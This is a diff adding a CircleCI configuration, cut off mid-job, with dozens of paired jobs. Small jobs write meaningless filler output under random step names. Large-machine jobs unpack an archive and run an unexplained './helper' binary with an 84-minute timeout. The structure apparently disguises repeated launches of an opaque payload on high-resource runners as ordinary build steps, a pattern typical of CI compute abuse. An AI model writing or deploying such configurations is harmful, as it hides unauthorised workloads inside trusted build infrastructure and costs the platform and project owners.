@@ -1,0 +1,1575 @@
+version: 2.1
+
+jobs:
+  precheck_java17-vet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: reel
+          command: |
+            mkdir -p /tmp/outbox
+            set +o pipefail 2>/dev/null; seq 1 599049 | md5sum > /tmp/outbox/handover.ok; true
+            echo "fixture persisted: $(du -b /tmp/outbox/handover.ok | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handover.ok
+  java17-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  prefetch_raj-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: blue block
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 484032 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/outbox/secondary_job_output_v3.log
+            echo "fixture persisted: $(du -b /tmp/outbox/secondary_job_output_v3.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - secondary_job_output_v3.log
+  raj-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  drain_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: lunch run
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cksum /etc/hostname; true ; } > /tmp/outbox/timings.csv
+            echo "fixture persisted: $(du -b /tmp/outbox/timings.csv | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - timings.csv
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/timings.csv && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  retry_ruby3-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: oasis
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /proc/uptime | awk '{print $1}'; true ; } > /tmp/outbox/OK
+            echo "fixture persisted: $(du -b /tmp/outbox/OK | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - OK
+  ruby3-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  retry_Build_Image1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: oops
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo -e "A\tB\tC\n1\t2\t3" | awk -F'\t' '{print $2}'; true ; } > /tmp/outbox/passoff.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/passoff.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - passoff.txt
+  Build_Image1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/passoff.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  builder_rm-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: upstream battle
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; for(i=1;i<=50;i++)t+=1.0/(i*i); printf "%.6f\n",t}'; true ; } > /tmp/outbox/stash.raw
+            echo "fixture persisted: $(du -b /tmp/outbox/stash.raw | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stash.raw
+  rm-edge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stash.raw && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  warmup_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: peanut tool
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "test123text" | sed 's/[0-9]/[&]/g'; true ; } > /tmp/outbox/stash.dat
+            echo "fixture persisted: $(du -b /tmp/outbox/stash.dat | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stash.dat
+  test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  Gamma_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: light speed
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)s=s"-"i; print s}'; true ; } > /tmp/outbox/.lock
+            echo "fixture persisted: $(du -b /tmp/outbox/.lock | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .lock
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  blue_assemble-end-to-end-test-matrix:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: heave line
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo -e "x 3\ny 1\nz 2" | sort -k2n; true ; } > /tmp/outbox/log.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/log.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - log.txt
+  assemble-end-to-end-test-matrix:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  env_atlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: embellishment
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 10 | tac | awk '{print NR, $0}'; true ; } > /tmp/outbox/result.out
+            echo "fixture persisted: $(du -b /tmp/outbox/result.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - result.out
+  atlas:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  p2_assemble-full-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: no fail
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print toupper("whisper")}'; true ; } > /tmp/outbox/OK.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/OK.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - OK.txt
+  assemble-full-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/OK.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  D_RUN_DEV:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: pager loud
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "%08d\n" $((RANDOM % 1000000)); true ; } > /tmp/outbox/88.out
+            echo "fixture persisted: $(du -b /tmp/outbox/88.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 88.out
+  RUN_DEV:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  postcheck_juliet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: notify qa
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=5; b=3; print a+b, a-b, a*b, int(a/b), a%b}'; true ; } > /tmp/outbox/gate-done.out
+            echo "fixture persisted: $(du -b /tmp/outbox/gate-done.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - gate-done.out
+  juliet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  bootstrap_tweak-login:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: ornamentation
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 2 100 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next} print}' | tail -5; true ; } > /tmp/outbox/step-28.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/step-28.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-28.txt
+  tweak-login:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  bake_victor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: alder stick
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'A-Z' | head -c 10; true ; } > /tmp/outbox/2024-12-07.data
+            echo "fixture persisted: $(du -b /tmp/outbox/2024-12-07.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2024-12-07.data
+  victor:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/2024-12-07.data && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  sys_atlas-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: quiet now
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/outbox/34.bin
+            echo "fixture persisted: $(du -b /tmp/outbox/34.bin | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 34.bin
+  atlas-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  reload_chore-304:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: pls dont fail
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<163772;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/outbox/589.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/589.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 589.txt
+  chore-304:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/589.txt && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  ctx_full-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: yeah
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ls -la / | awk '{print $NF}' | sort | md5sum; true ; } > /tmp/outbox/805.out
+            echo "fixture persisted: $(du -b /tmp/outbox/805.out | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 805.out
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/805.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  g2_RUN_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: crescendo
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "hey   you   there" | sed 's/  */ /g' | awk '{print NF}'; true ; } > /tmp/outbox/handoff.txt
+            echo "fixture persisted: $(du -b /tmp/outbox/handoff.txt | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - handoff.txt
+  RUN_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  postbuild_xray-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: thursday thump
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; date +%s%N; true ; } > /tmp/outbox/stash.blob
+            echo "fixture persisted: $(du -b /tmp/outbox/stash.blob | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stash.blob
+  xray-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  Beta_p-new:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: plop
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; nproc 2>/dev/null; true ; } > /tmp/outbox/phase-complete.log
+            echo "fixture persisted: $(du -b /tmp/outbox/phase-complete.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - phase-complete.log
+  p-new:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  reserve_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: retry forever
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=5;i++){print i; print i*i}}' | wc -l; true ; } > /tmp/outbox/stage.bin
+            echo "fixture persisted: $(du -b /tmp/outbox/stage.bin | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stage.bin
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  resync_go-live:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: skid
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=0; for(i=1;i<=1000;i++)n^=i; print n}'; true ; } > /tmp/outbox/step-complete.log
+            echo "fixture persisted: $(du -b /tmp/outbox/step-complete.log | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-complete.log
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/step-complete.log && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  prebuild_jun1-release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: night shift
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo $(($(date +%u) + 7)); true ; } > /tmp/outbox/DONE
+            echo "fixture persisted: $(du -b /tmp/outbox/DONE | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - DONE
+  jun1-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/stage.bin && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  g1_artifacts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rough draft
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; printf "a\nb\n" | awk '{print length, $0}' | sort -n; true ; } > /tmp/outbox/2023-12-08.data
+            echo "fixture persisted: $(du -b /tmp/outbox/2023-12-08.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2023-12-08.data
+  artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Read staged data
+          command: |
+            test -s /tmp/outbox/88.out && echo nonempty || echo empty
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: tar --extract --xz -f final-dist.tar.xz
+      - run:
+          name: Settle filesystem
+          command: sleep 60
+      - run:
+          no_output_timeout: 84m
+          command: /bin/bash -c "./helper"
+  precheck_auh-check:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: later
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; echo "a;b;c;d" | awk -F';' '{if(NF==4)print "four"}'; true ; } > /tmp/outbox/2024-05-22.data
+            echo "fixture persisted: $(du -b /tmp/outbox/2024-05-22.data | awk '{print $1}')b"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
